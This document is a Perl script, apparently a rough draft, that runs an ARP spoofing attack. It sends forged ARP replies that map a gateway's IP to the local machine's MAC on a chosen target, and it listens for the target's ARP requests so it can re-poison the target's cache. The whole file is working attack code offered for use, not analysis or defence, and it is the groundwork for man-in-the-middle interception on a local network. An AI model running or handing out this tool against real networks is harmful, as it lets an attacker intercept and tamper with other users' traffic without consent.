#!/usr/bin/perl
use strict;

use NetPacket::TCP;        # packet disassembly
use Net::Pcap;             # sniffing
use Net::ARP;              # craft,send ARP to target
use Net::Frame::Device;    # get local MAC
use Net::Frame::Dump::Online;
use Net::Frame::Simple;

#################getting target info#####################
my $target_ip  = shift;
my $target_mac = shift;
my $gateway_ip= shift;
#####getting local info###############################
my ( $dev, $err, $net, $mask );
$dev = pcap_lookupdev( \$err );


my $dev_info   = Net::Frame::Device->new( dev => $dev );
my $native_mac = $dev_info->mac();
my $native_ip  = $dev_info->ip();
pcap_lookupnet( $dev, \$net, \$mask, \$err );

print "got so far";
###########################################################
my $dumper = Net::Frame::Dump::Online->new( dev => $dev );
my $filterStr = "(arp)&&(ether dst " . $dev_info->mac . ")&&(ether src
" . $target_mac . ")";

my $pcap = Net::Frame::Dump::Online->new(
	dev => $dev,

	# network device
	filter => $filterStr,

	# add attackers MAC
	promisc => 0,

	# non promiscuous
	unlinkOnStop => 1,

	# deletes temp files
	timeoutOnNext => 1000

	  # waiting for ARP responses
);
$pcap->start;

send_arp_spoof();

#while (1) {

	#keep sending arp spoof

#}

sub send_arp_spoof {
	Net::ARP::send_packet(
		$dev,           # Device
		$gateway_ip,     # Source IP
		$target_ip,     # Destination IP
		$native_mac,    # Source MAC
		$target_mac,    # Destinaton MAC
		'reply'
	);                  # ARP operation
	
}

keep_spoofing();
sub keep_spoofing {

until($pcap->timeout){
	
	if(my $next=$pcap->next)
{
my $fref = Net::Frame::Simple->newFromDump($next);
if($fref->ref->{ARP}->opCode == 1){
	print "Got the request. Replying by arp";
	send_arp_spoof();
	}
	
}
	
	
}
return;
}

END{ $pcap->stop if($pcap); print "Exiting.\n"; }

